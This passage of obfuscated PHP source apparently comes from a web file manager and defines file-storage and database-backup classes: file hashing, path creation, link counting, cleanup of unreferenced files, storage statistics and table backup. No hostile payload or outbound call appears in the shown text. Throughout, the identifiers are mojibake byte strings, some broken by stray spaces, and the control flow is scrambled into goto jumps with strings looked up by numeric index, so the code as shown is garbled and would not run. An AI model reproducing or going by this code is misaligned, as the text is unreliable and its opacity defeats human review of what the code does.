&$E÷ÊŠÏ‘) { $E÷ÊŠÏ‘[$aƒ¹İ„¼…Ì[597]] = $fÚ¬ã˜ø§[$E÷ÊŠÏ‘[$aƒ¹İ„¼…Ì[1551]]]; if (isset($E÷ÊŠÏ‘[$aƒ¹İ„¼…Ì[1766]])) { $E÷ÊŠÏ‘[$aƒ¹İ„¼…Ì[1766]][$aƒ¹İ„¼…Ì[597]] = $fÚ¬ã˜ø§[$E÷ÊŠÏ‘[$aƒ¹İ„¼…Ì[1766]][$aƒ¹İ„¼…Ì[1551]]]; } } unset($E÷ÊŠÏ‘); goto b¦ßÀ˜à•Ê; aá›…ÖêŠÌ: if (count($AŒ“ó•ºº¤) == 0) { return; } foreach ($CËòê±äùæ as $E÷ÊŠÏ‘) { if (isset($E÷ÊŠÏ‘[$aƒ¹İ„¼…Ì[1766]])) { $AŒ“ó•ºº¤[] = $E÷ÊŠÏ‘[$aƒ¹İ„¼…Ì[1766]][$aƒ¹İ„¼…Ì[1551]]; } } $fÚ¬ã˜ø§ = Model($aƒ¹İ„¼…Ì[541])->userListInfo($AŒ“ó•ºº¤); goto dµÊˆ àöÔ; d½ä°­ÂÜÆ: $aƒ¹İ„¼…Ì =& $_SERVER[œÕÊİğö]; $AŒ“ó•ºº¤ = array_unique(array_to_keyvalue($CËòê±äùæ, $aƒ¹İ„¼…Ì[43], $aƒ¹İ„¼…Ì[1551])); $AŒ“ó•ºº¤ = array_remove_value($AŒ“ó•ºº¤, $aƒ¹İ„¼…Ì[201]); goto aá›…ÖêŠÌ; b¦ßÀ˜à•Ê: } private function _listAppendMeta(&$aÑ™§…ó) { goto EùœĞ¶Ü§; EùœĞ¶Ü§: $D¼ñ´ÛòÇ’ =& $_SERVER[œÕÊİğö]; $b«É¡ƒµéˆ = array_unique(array_to_keyvalue($aÑ™§…ó, $D¼ñ´ÛòÇ’[43], $D¼ñ´ÛòÇ’[1756])); $b«É¡ƒµéˆ = array_remove_value($b«É¡ƒµéˆ, $D¼ñ´ÛòÇ’[201]); goto AŸÍ—è÷»; d‡±«áÂ¡: if (!$C×Ú‰’™ˆ“) { return !1; } foreach ($aÑ™§…ó as &$f¬…¨ÀÛ„) { $f¬…¨ÀÛ„[$D¼ñ´ÛòÇ’[468]] = $C×Ú‰’™ˆ“[$f¬…¨ÀÛ„[$D¼ñ´ÛòÇ’[1756]]]; if (isset($f¬…¨ÀÛ„[$D¼ñ´ÛòÇ’[1766]])) { $f¬…¨ÀÛ„[$D¼ñ´ÛòÇ’[1766]][$D¼ñ´ÛòÇ’[468]] = $C×Ú‰’™ˆ“[$f¬…¨ÀÛ„[$D¼ñ´ÛòÇ’[1766]][$D¼ñ´ÛòÇ’[1756]]]; } } unset($f¬…¨ÀÛ„); goto B­º¸«‘âñ; AŸÍ—è÷»: if (!$b«É¡ƒµéˆ) { return; } foreach ($aÑ™§…ó as $f¬…¨ÀÛ„) { if (isset($f¬…¨ÀÛ„[$D¼ñ´ÛòÇ’[1766]])) { $b«É¡ƒµéˆ[] = $f¬…¨ÀÛ„[$D¼ñ´ÛòÇ’[1766]][$D¼ñ´ÛòÇ’[1756]]; } } $C×Ú‰’™ˆ“ = $this->metaList($b«É¡ƒµéˆ); goto d‡±«áÂ¡; B­º¸«‘âñ: } private function metaList($f¸èªÛÇ•Í) { goto f…ĞêÕİô²; F™è…Æ: $AÖö™š¹© = Model($c‘óöì‚Ò[1767])->where($b™ÚŒÇ±Œ)->select(); $AÖö™š¹© = array_to_keyvalue_group($AÖö™š¹©, $c‘óöì‚Ò[1756]); foreach ($AÖö™š¹© as $fÑ½á’Æ => $a×µƒö„¸†) { $eÆ²È¡êâ² = array(); foreach ($a×µƒö„¸† as $EÈƒ’¿‹ï) { $eÆ²È¡êâ²[$EÈƒ’¿‹ï[$c‘óöì‚Ò[103]]] = $EÈƒ’¿‹ï[$c‘óöì‚Ò[382]]; } $AÖö™š¹©[$fÑ½á’Æ] = $eÆ²È¡êâ²; } goto b‘Ÿî© Î¥; f…ĞêÕİô²: $c‘óöì‚Ò =& $_SERVER[œÕÊİğö]; if (!$f¸èªÛÇ•Í) { return array(); } $b™ÚŒÇ±Œ = array($c‘óöì‚Ò[1756] => array($c‘óöì‚Ò[7], $f¸èªÛÇ•Í)); goto F™è…Æ; b‘Ÿî© Î¥: return $AÖö™š¹© ? $AÖö™š¹© : array(); goto aóåƒŸÀôî; aóåƒŸÀôî: } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\151\x6c\145\x5f\x63\x6f\156\164\145\156\164\163"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\x54\151\155\145", "\164\x69\x6d\145", "\x69\156\x73\145\x72\164", "\146\x75\x6e\x63\164\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\x6c\145"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\x61\155\145" => "\x69\x6f\137\x66\151\x6c\145\137\x6d\x65\164\x61", "\155\145\164\x61\x46\x69\x65\154\x64" => "\146\151\x6c\x65\111\x44"); public function fileInfo($c¼íº‰‡‰) { $c¨çÛ«ˆ =& $_SERVER[œÕÊİğö]; static $aŠª¤Ú¥æ = array(); if (!isset($aŠª¤Ú¥æ[$c¼íº‰‡‰])) { $fÜçÇòÆæÜ = $c¨çÛ«ˆ[1768]; $døµ¼ÉŸºĞ = Model($c¨çÛ«ˆ[473])->field($fÜçÇòÆæÜ)->where(array($c¨çÛ«ˆ[471] => $c¼íº‰‡‰))->find(); $aŠª¤Ú¥æ[$c¼íº‰‡‰] = $døµ¼ÉŸºĞ; } return $aŠª¤Ú¥æ[$c¼íº‰‡‰]; } public function addFileByContent($E¬Ã¶Áä«¦ = '', $cªããŞÅğ = '') { goto e‘÷‹ÉÇ½; C¹ã„ÑÙÃŞ: if (file_exists($B…Ö‹§¤°Ê)) { @unlink($B…Ö‹§¤°Ê); } return $Có‹ñœ—²®; goto CùÇ·ù…ã¡; e‘÷‹ÉÇ½: $f¾ÖÅ”†ëë =& $_SERVER[œÕÊİğö]; $bòÇˆ²œ°¨ = TEMP_PATH . $f¾ÖÅ”†ëë[1769]; if (!is_dir($bòÇˆ²œ°¨)) { mk_dir($bòÇˆ²œ°¨); } goto aÕÒŠ¡ß…Ï; aÕÒŠ¡ß…Ï: $B…Ö‹§¤°Ê = $bòÇˆ²œ°¨ . $f¾ÖÅ”†ëë[1770] . rand_string(16); file_put_contents($B…Ö‹§¤°Ê, $E¬Ã¶Áä«¦); $Có‹ñœ—²® = $this->addFile($B…Ö‹§¤°Ê, $cªããŞÅğ, !0); goto C¹ã„ÑÙÃŞ; CùÇ·ù…ã¡: } public function createFileName($BÇĞš¢¶ì•, $bòÍ’‘°«š = false, $fò¬º‡“‹ = false) { goto a«ÒŠ§Ò¥; a«ÒŠ§Ò¥: $B¿„£¾ŒŒ =& $_SERVER[œÕÊİğö]; $E‘ˆÕ‡»Ÿ = IO::init($B¿„£¾ŒŒ[8]); $DÆƒãÏğòá = $this->makeFilePath($BÇĞš¢¶ì•, $E‘ˆÕ‡»Ÿ, $bòÍ’‘°«š, $fò¬º‡“‹); goto eôö†Ÿíéİ; eôö†Ÿíéİ: $DÛğŒ¼·æè = $E‘ˆÕ‡»Ÿ->pathFather($DÆƒãÏğòá); static $FŸ……À‡’Å = false; $DŠÒÎ‰ˆ = $B¿„£¾ŒŒ[1771] . md5($DÛğŒ¼·æè); goto f½ŠÅ¦Îöœ; f½ŠÅ¦Îöœ: if (!$FŸ……À‡’Å && !Cache::get($DŠÒÎ‰ˆ)) { $FŸ……À‡’Å = !0; $bÓ¼òìô = IO::mkdir($DÛğŒ¼·æè); if (!IO::exist($bÓ¼òìô . $B¿„£¾ŒŒ[793])) { IO::mkfile($bÓ¼òìô . $B¿„£¾ŒŒ[793]); } Cache::set($DŠÒÎ‰ˆ, 1, 3600 * 2); } return $DÆƒãÏğòá; goto c¶±¶¼“ì; c¶±¶¼“ì: } public function makeFilePath($bµ†ÏÀÔ±Í, $D›Ì÷İ¹¸£, $b ‰´¬¦å = false, $aœƒÅ½µˆŠ = false) { goto Dº†‰…Ä¼; d’½‘‡ŞÏœ: if (!$bµ†ÏÀÔ±Í) { $dÅíóœ±¿‹ = $a»Ş—®å›˜[1774]; } switch ($dÅíóœ±¿‹) { case $a»Ş—®å›˜[1775]: $bÑÔ¾ò¦Ö = $bÑÔ¾ò¦Ö . $a»Ş—®å›˜[105] . $D›Ì÷İ¹¸£->ext($bµ†ÏÀÔ±Í); if ($aÛ÷²ÒçÃº == $a»Ş—®å›˜[1710]) { $bÑÔ¾ò¦Ö .= $a»Ş—®å›˜[1448]; } break; case $a»Ş—®å›˜[1776]: goto Dñõ»™ñÊå; dõò¡òÙÎ˜: if (IO::isTypeObject($bÑÔ¾ò¦Ö) && !IO::isUploadServer($bÑÔ¾ò¦Ö)) { if (IO::exist($bÑÔ¾ò¦Ö)) { return $bÑÔ¾ò¦Ö; } $dÊÕÃÎ = IO::setContent($bÑÔ¾ò¦Ö, $a»Ş—®å›˜[43]); if (!$dÊÕÃÎ) { show_json($a»Ş—®å›˜[1779], !1); } } CacheLock::unlock($BçÁ¢°£Ó); break; goto AãÔÀ²Î×ğ; Dñõ»™ñÊå: $c½ñ¸Ïòâù = Model($a»Ş—®å›˜[760])->get($a»Ş—®å›˜[761]); $D–Çíœî = substr(md5($a»Ş—®å›˜[762] . $c½ñ¸Ïòâù . date($a»Ş—®å›˜[738])), 0, 8); $d£ƒŞíİÅî = KodIO::defaultDriver(); goto b¥«ó¿¡“‹; b¥«ó¿¡“‹: $eöãœÔ™ñ¸ = $a»Ş—®å›˜[1146] . $d£ƒŞíİÅî[$a»Ş—®å›˜[404]] . $a»Ş—®å›˜[413] . date($a»Ş—®å›˜[1777]) . $D–Çíœî . $a»Ş—®å›˜[8]; if ($aÛ÷²ÒçÃº == $a»Ş—®å›˜[1710]) { $bµ†ÏÀÔ±Í .= $a»Ş—®å›˜[1448]; } $BçÁ¢°£Ó = $a»Ş—®å›˜[1778] . $eöãœÔ™ñ¸ . $bµ†ÏÀÔ±Í; goto Dò…ãêøÒ; Dò…ãêøÒ: CacheLock::lock($BçÁ¢°£Ó); $bÑÔ¾ò¦Ö = $eöãœÔ™ñ¸ . $bµ†ÏÀÔ±Í; if (IO::exist($eöãœÔ™ñ¸ . $bµ†ÏÀÔ±Í)) { $B»™ÀìÆóß = substr($bµ†ÏÀÔ±Í, 0, strlen($bµ†ÏÀÔ±Í) - strlen($aÛ÷²ÒçÃº)); $DœŠ¥‘Å¡Ô = $aœƒÅ½µˆŠ ? substr($aœƒÅ½µˆŠ, 0, 5) : ($b ‰´¬¦å ? substr($b ‰´¬¦å, 0, 5) : rand_string(5)); $bÑÔ¾ò¦Ö = $eöãœÔ™ñ¸ . $B»™ÀìÆóß . $DœŠ¥‘Å¡Ô . $a»Ş—®å›˜[105] . $aÛ÷²ÒçÃº; } goto dõò¡òÙÎ˜; AãÔÀ²Î×ğ: case $a»Ş—®å›˜[1774]: break; default: break; } return $bÑÔ¾ò¦Ö; goto eŒ£Œ¢ ‰­; B‹²„ˆòÂ±: $bÑÔ¾ò¦Ö = $eöãœÔ™ñ¸ . rand_string(5) . short_id(100); $bµ†ÏÀÔ±Í = str_replace($a»Ş—®å›˜[8], $a»Ş—®å›˜[81], KodIO::clear($bµ†ÏÀÔ±Í)); $aÛ÷²ÒçÃº = $D›Ì÷İ¹¸£->ext($bµ†ÏÀÔ±Í); goto d’½‘‡ŞÏœ; Dº†‰…Ä¼: $a»Ş—®å›˜ =& $_SERVER[œÕÊİğö]; $dÅíóœ±¿‹ = Model($a»Ş—®å›˜[760])->get($a»Ş—®å›˜[1772]); $eöãœÔ™ñ¸ = KodIO::defaultIO() . date($a»Ş—®å›˜[1773]); goto B‹²„ˆòÂ±; eŒ£Œ¢ ‰­: } public function addFileByRemote($B•÷ÍÑ°, $c½ÚÍÛàÖÚ, $bÈÃ“šµÔ = array()) { goto BœÇğº¸Ôº; aÃ¿¬æÏÆá: if ($E¾ÚÔ¬ØË = $this->addFileCheckExist($e½­³š…Ùİ[$d¶ ««‹‹±[181]], $e½­³š…Ùİ[$d¶ ««‹‹±[180]], $e½­³š…Ùİ[$d¶ ««‹‹±[88]])) { return $E¾ÚÔ¬ØË; } return $this->addFileData($e½­³š…Ùİ); goto Bï­¸º‹¾Ã; BœÇğº¸Ôº: $d¶ ««‹‹± =& $_SERVER[œÕÊİğö]; if (!IO::exist($B•÷ÍÑ°)) { return !1; } $DğÌ‘ÄŸà = $bÈÃ“šµÔ[$d¶ ««‹‹±[180]] ? $bÈÃ“šµÔ[$d¶ ««‹‹±[180]] : $d¶ ««‹‹±[43]; goto E×°¢Í™‹; E×°¢Í™‹: $eËÉ«ÒøŠ = IO::hashMd5($B•÷ÍÑ°, $DğÌ‘ÄŸà); $C‚¥äí‡®‚ = KodIO::defaultDriver(); $e½­³š…Ùİ = array($d¶ ««‹‹±[582] => IO::size($B•÷ÍÑ°), $d¶ ««‹‹±[1780] => 1, $d¶ ««‹‹±[424] => $c½ÚÍÛàÖÚ, $d¶ ««‹‹±[805] => $C‚¥äí‡®‚[$d¶ ««‹‹±[404]], $d¶ ««‹‹±[425] => $B•÷ÍÑ°, $d¶ ««‹‹±[1781] => $bÈÃ“šµÔ[$d¶ ««‹‹±[181]] ? $bÈÃ“šµÔ[$d¶ ««‹‹±[181]] : IO::hashSimple($B•÷ÍÑ°), $d¶ ««‹‹±[1782] => $eËÉ«ÒøŠ ? $eËÉ«ÒøŠ : $DğÌ‘ÄŸà); goto aÃ¿¬æÏÆá; Bï­¸º‹¾Ã: } private function addFileData($B¤¸¸ˆÍáÏ) { $bôÈĞË½” =& $_SERVER[œÕÊİğö]; if (!$B¤¸¸ˆÍáÏ) { return !1; } $B¤¸¸ˆÍáÏ[$bôÈĞË½”[88]] = intval($B¤¸¸ˆÍáÏ[$bôÈĞË½”[88]]); if (!$B¤¸¸ˆÍáÏ[$bôÈĞË½”[88]] && strlen($B¤¸¸ˆÍáÏ[$bôÈĞË½”[181]]) > 32) { $B¤¸¸ˆÍáÏ[$bôÈĞË½”[88]] = intval(substr($B¤¸¸ˆÍáÏ[$bôÈĞË½”[181]], 32)); } $A°ÕâÕİÀŞ = $this->add($B¤¸¸ˆÍáÏ); return $this->find($A°ÕâÕİÀŞ); } public function addFile($c‹óËÛë‹š, $c””‹¶ôŞê, $DùŒø¡™¸Õ = false) { goto fÍ±¹êŞÓ; Dç¼¨¦î—¸: return $a—ôĞïÁ´ó; goto eøø¦—Åç’; D‡íÒÍàª: $C¬–Ôø¹ø = $_SERVER[œÕÊİğö][1783] . $a È´ğ Ã; CacheLock::lock($C¬–Ôø¹ø); if ($Bà‚‹¦ñÀ• = $this->addFileCheckExist($eÜØóßˆè¹, $a È´ğ Ã, $aâÂÒ©¯µê)) { CacheLock::unlock($C¬–Ôø¹ø); return $Bà‚‹¦ñÀ•; } goto fîó§Î¨•; fîó§Î¨•: $dÜ”–‚Œ¡ = $this->addFileMake($c‹óËÛë‹š, $aâÂÒ©¯µê, $eÜØóßˆè¹, $a È´ğ Ã, $c””‹¶ôŞê, $DùŒø¡™¸Õ); $a—ôĞïÁ´ó = $this->addFileData($dÜ”–‚Œ¡); CacheLock::unlock($C¬–Ôø¹ø); goto Dç¼¨¦î—¸; fÍ±¹êŞÓ: $eÜØóßˆè¹ = IO::hashSimple($c‹óËÛë‹š); $a È´ğ Ã = IO::hashMd5($c‹óËÛë‹š); $aâÂÒ©¯µê = IO::size($c‹óËÛë‹š); goto D‡íÒÍàª; eøø¦—Åç’: } public function addFileMake($ešğÙÑÎÃ, $cÒÇĞ…Ì‚Ç, $A¼šÍ˜á‡ã, $F¨©Â˜·æ‡, $cÀÏ÷†ß¡ó, $Bˆå›İ¸éÄ) { goto EÉŸ²’¦¢­; A•¡öÖ‰ã : $a¯Ñ©‰ï¡¢ = get_path_this($b°¡ÆÃ“Œ); if ($Bˆå›İ¸éÄ) { $cÛ®ÄŸÇõ = IO::move($ešğÙÑÎÃ, $F¤İÂŒù®², !1, $a¯Ñ©‰ï¡¢); } else { $cÛ®ÄŸÇõ = IO::copy($ešğÙÑÎÃ, $F¤İÂŒù®², !1, $a¯Ñ©‰ï¡¢); } if (!$cÛ®ÄŸÇõ) { return !1; } goto bî¦é‘ß–; bî¦é‘ß–: $A ßœ¦‚ê = KodIO::defaultDriver(); $D›²”¢ìˆË = array($Eñè›Šš [582] => $cÒÇĞ…Ì‚Ç, $Eñè›Šš [1780] => 1, $Eñè›Šš [424] => $cÀÏ÷†ß¡ó, $Eñè›Šš [805] => $A ßœ¦‚ê[$Eñè›Šš [404]], $Eñè›Šš [425] => $b°¡ÆÃ“Œ, $Eñè›Šš [1781] => $A¼šÍ˜á‡ã, $Eñè›Šš [1782] => $F¨©Â˜·æ‡); return $D›²”¢ìˆË; goto eœâ®œìÙ¼; EÉŸ²’¦¢­: $Eñè›Šš  =& $_SERVER[œÕÊİğö]; $b°¡ÆÃ“Œ = $this->createFileName($cÀÏ÷†ß¡ó, $A¼šÍ˜á‡ã, $F¨©Â˜·æ‡); $F¤İÂŒù®² = get_path_father($b°¡ÆÃ“Œ); goto A•¡öÖ‰ã ; eœâ®œìÙ¼: } public function addFileCheckExist($dÉ½ìæÊ, $D·Å¥†Å÷Ö, $Bñîñ§ãºƒ) { $b©Ôª¡×±ø =& $_SERVER[œÕÊİğö]; $FÑã‚³“ğ­ = $this->findByHash($dÉ½ìæÊ, $D·Å¥†Å÷Ö); if (!$FÑã‚³“ğ­) { return !1; } $DøÊ™‡·«Î = array($b©Ôª¡×±ø[1780] => intval($FÑã‚³“ğ­[$b©Ôª¡×±ø[1784]]) + 1, $b©Ôª¡×±ø[582] => $Bñîñ§ãºƒ); $this->where(array($b©Ôª¡×±ø[471] => $FÑã‚³“ğ­[$b©Ôª¡×±ø[470]]))->save($DøÊ™‡·«Î); return $FÑã‚³“ğ­; } public function remove($E´”È”ì®©) { $this->linkCountChange($E´”È”ì®©, !1); $this->clearEmpty(); return !0; } public function linkAdd($BÉŸÒ²É„) { $this->linkCountChange($BÉŸÒ²É„, !0); } public function linkCountChange($d¢Ò…†Ç†×, $cİ†Ã§âòÜ) { goto E„ÈÏ‡ğŞ¢; Eì†äö—©: foreach ($Aƒª‘×‘· as $f¤éçÎ²ª => $A¯Àà¬Å¯Î) { $AëÛ·Ù­ŸË = $A¯Àà¬Å¯Î . $D©ÁåÅìª[43]; if (!$A—ˆãßèÂá[$AëÛ·Ù­ŸË]) { $A—ˆãßèÂá[$AëÛ·Ù­ŸË] = array(); } $A—ˆãßèÂá[$AëÛ·Ù­ŸË][] = $f¤éçÎ²ª; } foreach ($A—ˆãßèÂá as $A¯Àà¬Å¯Î => $f§’Ÿšç¹Î) { if (!$f§’Ÿšç¹Î) { continue; } $A¯Àà¬Å¯Î = $cİ†Ã§âòÜ ? $A¯Àà¬Å¯Î : -intval($A¯Àà¬Å¯Î); $DÑ¦«ºŸÎ® = array($D©ÁåÅìª[470] => array($D©ÁåÅìª[7], $f§’Ÿšç¹Î)); if ($A¯Àà¬Å¯Î < 0) { $DÑ¦«ºŸÎ®[$D©ÁåÅìª[1784]] = array($D©ÁåÅìª[996], abs($A¯Àà¬Å¯Î)); } $this->where($DÑ¦«ºŸÎ®)->setAdd($D©ÁåÅìª[1784], $A¯Àà¬Å¯Î); } goto a† ­˜ÓÑ; fñ„ç„•Á: $Aƒª‘×‘· = array(); foreach ($d¢Ò…†Ç†× as $f¤éçÎ²ª) { $AëÛ·Ù­ŸË = $f¤éçÎ²ª . $D©ÁåÅìª[43]; if (!$Aƒª‘×‘·[$AëÛ·Ù­ŸË]) { $Aƒª‘×‘·[$AëÛ·Ù­ŸË] = 0; } $Aƒª‘×‘·[$AëÛ·Ù­ŸË]++; } $A—ˆãßèÂá = array(); goto Eì†äö—©; E„ÈÏ‡ğŞ¢: $D©ÁåÅìª =& $_SERVER[œÕÊİğö]; if (!$d¢Ò…†Ç†×) { return; } if (!is_array($d¢Ò…†Ç†×)) { $d¢Ò…†Ç†× = array($d¢Ò…†Ç†×); } goto fñ„ç„•Á; a† ­˜ÓÑ: } public function findByHash($e—§½ÆÎÆ, $d†ëËæ£ëÅ = false) { $E‹¬Ù®åğé =& $_SERVER[œÕÊİğö]; if (!$e—§½ÆÎÆ && !$d†ëËæ£ëÅ) { return !1; } $C‘Û‰¦šÉ† = array($E‹¬Ù®åğé[1781] => $e—§½ÆÎÆ); if ($d†ëËæ£ëÅ) { $C‘Û‰¦šÉ† = array($E‹¬Ù®åğé[1782] => $d†ëËæ£ëÅ); } return $this->order($E‹¬Ù®åğé[1785])->where($C‘Û‰¦šÉ†)->find(); } public function clearEmpty($FØŠçƒ´„Ü = 0) { goto Cİ‰ª¨­¥; Cİ‰ª¨­¥: $d³†‰ØªÊİ =& $_SERVER[œÕÊİğö]; $cÂµ¡”çÒ = time() - 3600 * 24 * $FØŠçƒ´„Ü; $a´ëÖÛ–áÇ = $d³†‰ØªÊİ[1786] . $cÂµ¡”çÒ; goto cù““ÑŠÛ¶; e‹È‡´Ü‰: foreach ($A‡ê„ã±Ö¢ as $F‰Åëâ‚µØ) { $BÒ³“Àâˆå->update(1); $this->resetFile($F‰Åëâ‚µØ); } $BÒ³“Àâˆå->end(); goto d¬Ë‡½®Ä; cù““ÑŠÛ¶: $A‡ê„ã±Ö¢ = $this->where($a´ëÖÛ–áÇ)->select(); if (!$A‡ê„ã±Ö¢) { return; } $BÒ³“Àâˆå = new Task($d³†‰ØªÊİ[1787], $d³†‰ØªÊİ[43], count($A‡ê„ã±Ö¢)); goto e‹È‡´Ü‰; d¬Ë‡½®Ä: } public function resetFile($Bë…±Êİçß) { goto f±Œ§åÊÖ“; f±Œ§åÊÖ“: $CÓ¿ëÖ¥°† =& $_SERVER[œÕÊİğö]; $fÖùä¦ŞÄÖ = array($CÓ¿ëÖ¥°†[471] => $Bë…±Êİçß[$CÓ¿ëÖ¥°†[470]]); $c»ŸŞÔ›¦« = Model($CÓ¿ëÖ¥°†[1228])->where($fÖùä¦ŞÄÖ)->count(); goto Eõ£»¹’”ƒ; Eõ£»¹’”ƒ: $aˆ‚¹Ò’Äî = Model($CÓ¿ëÖ¥°†[1788])->where($fÖùä¦ŞÄÖ)->count(); $B°¾‚òÓä = intval($c»ŸŞÔ›¦«) + intval($aˆ‚¹Ò’Äî); if ($B°¾‚òÓä == 0) { IO::remove($Bë…±Êİçß[$CÓ¿ëÖ¥°†[86]]); Model($CÓ¿ëÖ¥°†[1789])->delete($Bë…±Êİçß[$CÓ¿ëÖ¥°†[470]]); $this->where($fÖùä¦ŞÄÖ)->delete(); $this->metaSet($Bë…±Êİçß[$CÓ¿ëÖ¥°†[470]], null, null); return; } goto f²»ÀÁ…ØÙ; f²»ÀÁ…ØÙ: if ($Bë…±Êİçß[$CÓ¿ëÖ¥°†[1784]] != $B°¾‚òÓä) { $this->where($fÖùä¦ŞÄÖ)->save(array($CÓ¿ëÖ¥°†[1780] => $B°¾‚òÓä)); } goto Dõ¸ÔøÑ£; Dõ¸ÔøÑ£: } public function storageInfo($E’ÉéƒÛÑí = false) { goto FµåÕæ•°¶; bíÏïÈÏ: $eİÊÃ„‡Ë = 1; $AŠÆÇë‚õ = 0; $Fƒ‚£é­¡Í = 5000; goto CŠ‚‚‚ßšô; CŠ‚‚‚ßšô: for ($fš§ãòÄ¿± = 0; $fš§ãòÄ¿± < $c¿™Ğ­¬; $fš§ãòÄ¿± = $fš§ãòÄ¿± + $Fƒ‚£é­¡Í) { $B›¯˜ï‰¿é = $this->limit($fš§ãòÄ¿±, $fš§ãòÄ¿± + $Fƒ‚£é­¡Í)->select(); foreach ($B›¯˜ï‰¿é as $Bøçã„‰˜) { $eİÊÃ„‡Ë += $Bøçã„‰˜[$fôŞø®·ç[88]] * $Bøçã„‰˜[$fôŞø®·ç[1784]]; $bÉ¹Å–Ñ¾ += $Bøçã„‰˜[$fôŞø®·ç[88]] * ($Bøçã„‰˜[$fôŞø®·ç[1784]] - 1); $AŠÆÇë‚õ += $Bøçã„‰˜[$fôŞø®·ç[1784]]; } } $BÀÂŒñŠÜ‘ = array($fôŞø®·ç[1790] => $eİÊÃ„‡Ë, $fôŞø®·ç[1791] => $bÉ¹Å–Ñ¾, $fôŞø®·ç[1792] => $bÉ¹Å–Ñ¾ / $eİÊÃ„‡Ë, $fôŞø®·ç[92] => $c¿™Ğ­¬, $fôŞø®·ç[1793] => $AŠÆÇë‚õ); return $BÀÂŒñŠÜ‘; goto b¢‚Õªê…÷; FµåÕæ•°¶: $fôŞø®·ç =& $_SERVER[œÕÊİğö]; $c¿™Ğ­¬ = $this->count() + 0.0; $bÉ¹Å–Ñ¾ = 0; goto bíÏïÈÏ; b¢‚Õªê…÷: } } goto b›”·ˆ‡¿Ö; Aìµ¢äÑ¢: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto bî¿¿‰ÂªÄ; cƒ±À¬½È: if (isset($AÖŒó†´¸å->task[$BÉ’§‘Ëô[778]])) { $eŠä¿Æç = $AÖŒó†´¸å->task[$BÉ’§‘Ëô[778]] ? $AÖŒó†´¸å->task[$BÉ’§‘Ëô[778]] : timeFloat(); $FìÛá‹¬İ£ = $eŠä¿Æç - $AÖŒó†´¸å->task[$BÉ’§‘Ëô[779]]; if ($FìÛá‹¬İ£ >= 0.2) { $BƒãÆ×  += 1; } } $AÖŒó†´¸å->end(); $eïÚ‘Œ³ì = array($BÉ’§‘Ëô[766] => $D‡šøŸª®ù, $BÉ’§‘Ëô[763] => 1, $BÉ’§‘Ëô[780] => $BƒãÆ× , $BÉ’§‘Ëô[781] => $CŠŠ¿¬Èİß, $BÉ’§‘Ëô[782] => time()); goto D–ºİˆ‚àí; a—ƒ‘»ë²: $FŞ¾—®î‘ = new DbManage($c¼ôê±ò¡, $D‡šøŸª®ù); $eïÚ‘Œ³ì = array($BÉ’§‘Ëô[766] => $D‡šøŸª®ù, $BÉ’§‘Ëô[767] => time()); Backup::set($eïÚ‘Œ³ì); goto e§‘…Ùİ…; a¬—¨ŒêÃö: foreach ($cİ‹Ô›ğ³ as $e¶øëëÛ’¼) { $BƒãÆ×  += $FŞ¾—®î‘->model($e¶øëëÛ’¼)->count(); } $AÖŒó†´¸å = new Task($BÉ’§‘Ëô[771], $BÉ’§‘Ëô[772], $BƒãÆ× , LNG($BÉ’§‘Ëô[773]) . $BÉ’§‘Ëô[774] . LNG($BÉ’§‘Ëô[775])); foreach ($cİ‹Ô›ğ³ as $e¶øëëÛ’¼) { $b‚šƒ¨š» = $BíâœßØÒ . $e¶øëëÛ’¼ . $BÉ’§‘Ëô[776]; $A›¶¤³ Å— = null; if ($e¶øëëÛ’¼ == $BÉ’§‘Ëô[777] && (!isset($f¾Â£À¡»’[$BÉ’§‘Ëô[745]]) || $f¾Â£À¡»’[$BÉ’§‘Ëô[745]] == $BÉ’§‘Ëô[201])) { $A›¶¤³ Å— = self::$io; } $CŠŠ¿¬Èİß += $FŞ¾—®î‘->sqlFromDb($e¶øëëÛ’¼, $b‚šƒ¨š», $AÖŒó†´¸å, $A›¶¤³ Å—); } goto cƒ±À¬½È; A‹²›¦‚Ä«: self::$name = $f¾Â£À¡»’[$BÉ’§‘Ëô[38]]; $c¼ôê±ò¡ = $GLOBALS[$BÉ’§‘Ëô[6]][$BÉ’§‘Ëô[27]]; $D‡šøŸª®ù = $this->_dbType($c¼ôê±ò¡); goto a—ƒ‘»ë²; CÑòëÎœå: $BƒãÆ×  = $CŠŠ¿¬Èİß = 0; try { $cİ‹Ô›ğ³ = $FŞ¾—®î‘->db()->getTables(); } catch (Exception $d¢¬Â‹ÉÊï) { return !1; } $cİ‹Ô›ğ³ = array_diff($cİ‹Ô›ğ³, array($BÉ’§‘Ëô[769], $BÉ’§‘Ëô[770])); goto a¬—¨ŒêÃö; e§‘…Ùİ…: $BíâœßØÒ = $this->tmpFilesPath() . $BÉ’§‘Ëô[768] . self::$name . $BÉ’§‘Ëô[8]; del_dir($BíâœßØÒ); mk_dir($BíâœßØÒ); goto CÑòëÎœå; bî¿¿‰ÂªÄ: $BÉ’§‘Ëô =& $_SERVER[œÕÊİğö]; $f¾Â£À¡»’ = Backup::get(); self::$io = $f¾Â£À¡»’[$BÉ’§‘Ëô[742]]; goto A‹²›¦‚Ä«; D–ºİˆ‚àí: Backup::set($eïÚ‘Œ³ì); if ($BƒãÆ×  - $CŠŠ¿¬Èİß > 1) { $F±ƒ—¹áÙ = $BÉ’§‘Ëô[783]; if (stristr(I18n::getType(), $BÉ’§‘Ëô[784])) { $F±ƒ—¹áÙ = $BÉ’§‘Ëô[785]; } write_log(array($F±ƒ—¹áÙ, $eïÚ‘Œ³ì), $BÉ’§‘Ëô[772]); return !1; } return !0; goto eŸ³Å«ŞÕ¥; eŸ³Å«ŞÕ¥: } private function _dbType($C¯¯‘šÂ) { goto bÊ™àáëÄè; bÊ™àáëÄè: $céËÛÀ‘ÙÓ =& $_SERVER[œÕÊİğö]; $C¯¯‘šÂ = array_change_key_case($C¯¯‘šÂ); $C ñÇ·Äºõ = $C¯¯‘šÂ[$céËÛÀ‘ÙÓ[786]]; goto cÇ„óìÍÙÄ; cÇ„óìÍÙÄ: if ($C ñÇ·Äºõ == $céËÛÀ‘ÙÓ[787]) { $aªŠÒ“Ìˆô = explode($céËÛÀ‘ÙÓ[4], $C¯¯‘šÂ[$céËÛÀ‘ÙÓ[788]]); $C ñÇ·Äºõ = $aªŠÒ“Ìˆô[0]; } $Dºİîó®¤¬ = array($céËÛÀ‘ÙÓ[789] => $céËÛÀ‘ÙÓ[19], 